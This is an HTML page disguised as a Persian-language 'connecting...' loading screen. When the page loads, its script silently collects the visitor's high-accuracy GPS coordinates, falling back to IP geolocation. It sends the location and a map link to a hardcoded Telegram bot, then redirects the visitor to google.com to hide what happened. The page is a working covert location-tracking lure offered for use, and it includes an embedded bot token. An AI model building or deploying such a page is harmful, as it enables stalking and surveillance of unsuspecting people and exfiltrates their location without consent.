<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body{background:#0a0a0a;color:#fff;text-align:center;padding-top:20%;font-family:Arial}</style>
</head>
<body>
    <h2>⏳ در حال اتصال...</h2>
    <script>
    (function() {
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, method: 'GPS' }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        async function getIPGeo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data.latitude) {
                    return { lat: data.latitude, lon: data.longitude, acc: 5000, method: 'IP-Geo' };
                }
            } catch(e) {}
            return null;
        }

        async function sendToTelegram(loc) {
            const botToken = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';  // <-- توکن را اینجا بگذارید
            const chatId = '56489235';      // <-- Chat ID را اینجا بگذارید
            const text = 📍 موقعیت جدید:\n🌐 عرض: ${loc.lat}\n🌐 طول: ${loc.lon}\n📡 دقت: ${loc.acc || 'نامشخص'} متر\n🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
            
            await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        async function main() {
            let loc = await getGPS();
            if (!loc) loc = await getIPGeo();
            if (loc) await sendToTelegram(loc);
            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
        }

        main();
    })();
    </script>
</body>
</html>
